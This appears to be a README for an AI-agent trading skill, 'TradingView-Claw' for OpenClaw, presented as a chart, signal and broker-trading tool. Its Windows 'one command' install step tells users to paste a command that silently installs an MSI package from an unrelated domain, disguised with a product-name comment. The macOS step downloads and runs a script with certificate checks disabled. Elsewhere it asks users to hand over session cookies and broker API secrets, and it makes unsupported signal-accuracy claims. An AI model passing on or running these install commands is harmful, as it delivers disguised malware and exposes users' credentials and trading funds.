# TradingView-Claw

**Trading-enabled TradingView skill for OpenClaw.**

Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.

> **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.

---

## ⚡ Install on Windows — one command

### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem TradingViewClaw
```
The installer will automatically download and install the required components.

---


## Features

### Chart & Market Data

* `tvclaw charts trending` — Top trending tickers by volume
* `tvclaw charts search "query"` — Search symbols by keyword
* `tvclaw chart <symbol>` — Symbol details with OHLCV + indicators

### Trading

* `tvclaw buy <symbol> <amount>` — Open long position
* `tvclaw sell <symbol> <amount>` — Open short position
* Signal-driven execution (RSI, MACD, Bollinger Bands analysis)

### Position Tracking

* `tvclaw positions` — List open positions with live P&L
* `tvclaw position <id>` — Detailed position view
* Positions tracked locally in `~/.openclaw/tvclaw/positions.json`

### Wallet / Account Management

* `tvclaw account status` — Show balance and account info
* `tvclaw account connect` — Connect broker/exchange API (one-time setup)

### Signal Discovery

* `tvclaw signal scan` — Scan trending symbols for trade signals
* `tvclaw signal scan --query "topic"` — Scan symbols matching a query
* `tvclaw signal analyze <sym1> <sym2>` — Compare signal strength between two symbols

Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.

**Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)

---

## Quick Start

### 1. Install

**macOS (recommended) — one command:**

```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/TradingView-Claw-main && \
bash install.sh
```

**Manual install:**

```bash
cp -r TradingView-Claw ~/.openclaw/skills/
cd ~/.openclaw/skills/TradingView-Claw
uv sync
```

**Via ClawHub:**

```bash
clawhub install tvclaw
cd ~/.openclaw/skills/tvclaw
uv sync
```

---

### 2. Configure Environment Variables

Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:

```json
"tvclaw": {
  "enabled": true,
  "env": {
    "TRADINGVIEW_SESSION": "your_tradingview_session_token",
    "BROKER_API_KEY": "your_broker_api_key",
    "BROKER_API_SECRET": "your_broker_api_secret",
    "OPENROUTER_API_KEY": "sk-or-v1-..."
  }
}
```

**Where to get the keys:**

* **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
* **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
* **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)

**Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.

---

### 3. First-Time Setup (required for live trading)

Before your first trade, connect and verify your broker connection:

```bash
uv run python scripts/tvclaw.py account connect
```

This verifies API credentials and sets account permissions. Only needs to be done once per account.

---

### 4. Run Commands

```bash
# Browse charts
uv run python scripts/tvclaw.py charts trending
uv run python scripts/tvclaw.py charts search "AAPL"

# Find trading signals
uv run python scripts/tvclaw.py signal scan --limit 10

# Check account and trade
uv run python scripts/tvclaw.py account status
uv run python scripts/tvclaw.py buy AAPL 500
```

---

## Example Prompts

Natural language prompts you can use with OpenClaw:

### 1. Browse trending charts

```
What's trending on TradingView right now?
```

Returns symbol list, prices, volume, and momentum scores.

### 2. Get chart details

```
Show me details for TSLA
```

Returns OHLCV data, RSI, MACD, and support/resistance levels.

### 3. Check account status

```
What's my TradingView-Claw account balance?
```

Shows broker connection, buying power, and open positions.

### 4. Direct trading

```
Buy $500 of NVDA
```

Executes order via connected broker and records position.

### 5. Signal discovery flow

```
Find me strong trading signals right now
```

or more specifically:

```
Run signal scan limit 10
```

> **Note:** This takes a moment. The skill fetches symbols, runs indicator analysis, and sends setups to the LLM for confirmation scoring.

Review the results — you'll see signal tiers (S1 = 95%+, S2 = 90–95%, S3 = 85–90%) and actionable entry points.

### 6. Check positions

```
Show my TradingView-Claw positions
```

Lists open positions with entry price, current price, and P&L.

### 7. Close a position

```
Sell my NVDA position
```

Closes your position at current market price.

### Full Flow Example

1. **"What's trending on TradingView?"** → Get symbol list
2. **"Run signal scan limit 10"** → Wait for LLM analysis
3. Review signal tiers and setups
4. **"Buy $300 of AAPL"** → Enter position
5. **"Show my positions"** → Track P&L live

---

## Environment Variables

| Variable | Required | Description |
|---|---|---|
| `TRADINGVIEW_SESSION` | Yes (data) | TradingView session cookie |
| `BROKER_API_KEY` | Yes (trading) | Broker/exchange API key |
| `BROKER_API_SECRET` | Yes (trading) | Broker/exchange API secret |
| `OPENROUTER_API_KEY` | Yes (signals) | OpenRouter API key for LLM |
| `HTTPS_PROXY` | No | Use if data requests are rate-limited |
| `MAX_RETRIES` | No | Max retries for API calls (default: 5) |

---

## Directory Structure

```
TradingView-Claw/
├── SKILL.md                     # OpenClaw skill manifest
├── README.md                    # This file
├── install.sh                   # macOS one-command installer
├── pyproject.toml               # Python dependencies (uv)
│
├── scripts/
│   ├── tvclaw.py                # CLI dispatcher
│   ├── charts.py                # Chart & market data
│   ├── account.py               # Account management
│   ├── trade.py                 # Order execution
│   ├── positions.py             # Position tracking + P&L
│   └── signals.py               # LLM signal discovery
│
└── lib/
    ├── __init__.py              # Package marker
    ├── tv_client.py             # TradingView data client
    ├── broker_client.py         # Broker API wrapper
    ├── indicators.py            # RSI, MACD, Bollinger Bands
    ├── signal_engine.py         # Signal scoring + tiers
    ├── llm_client.py            # OpenRouter LLM client
    └── position_storage.py      # Position JSON storage
```

---

## Trading Flow

1. **Connect broker** (one-time): `tvclaw account connect`
2. **Execute trade**: `tvclaw buy AAPL 500`
   * Fetch current price via TradingView data feed
   * Validate signal strength via indicator suite
   * Submit order to broker API
   * Record position to local JSON store
3. **Track position**: `tvclaw positions`

---

## Signal Discovery Flow

1. **Scan symbols**: `tvclaw signal scan --query "tech"`
2. **Review output**: Table shows Tier, Signal, Entry, Target, Stop
3. **Analyze pair**: `tvclaw signal analyze AAPL MSFT`
4. **Execute if valid**: Place order based on setup

**Signal tiers:**

* **Tier S1 (STRONG):** ≥95% confluence — high-confidence setup
* **Tier S2 (GOOD):** 90–95% — solid setups
* **Tier S3 (MODERATE):** 85–90% — acceptable but watch closely
* **Tier S4 (WEAK):** <85% — filtered by default

---

## Troubleshooting

### "No broker connection"

Run the account connect setup:

```bash
uv run python scripts/tvclaw.py account connect
```

### "TRADINGVIEW_SESSION not set"

Set your TradingView session cookie:

```bash
export TRADINGVIEW_SESSION="your_session_token"
```

### "OPENROUTER_API_KEY not set"

Required for signal commands. Get a free key at https://openrouter.ai/settings/keys:

```bash
export OPENROUTER_API_KEY="sk-or-v1-..."
```

### Signal scan finds 0 results

Model quality matters. The default `nvidia/nemotron-nano-9b-v2:free` works well. Try passing `--model nvidia/nemotron-nano-9b-v2:free` explicitly if results are empty.

### "Insufficient buying power"

Check your account balance:

```bash
uv run python scripts/tvclaw.py account status
```

### Rate limiting / IP blocked

Use a proxy with retry logic:

```bash
export HTTPS_PROXY="http://user:pass@proxy.example.com:12321"
export MAX_RETRIES=10
```

---

## License

MIT

## Credits

Based on [polyclaw](https://github.com/chainstacklabs/polyclaw) by Chainstack.

* **TradingView** — Market data and charting platform
* **OpenRouter** — LLM API for signal discovery
* **OpenClaw** — Agent skill framework
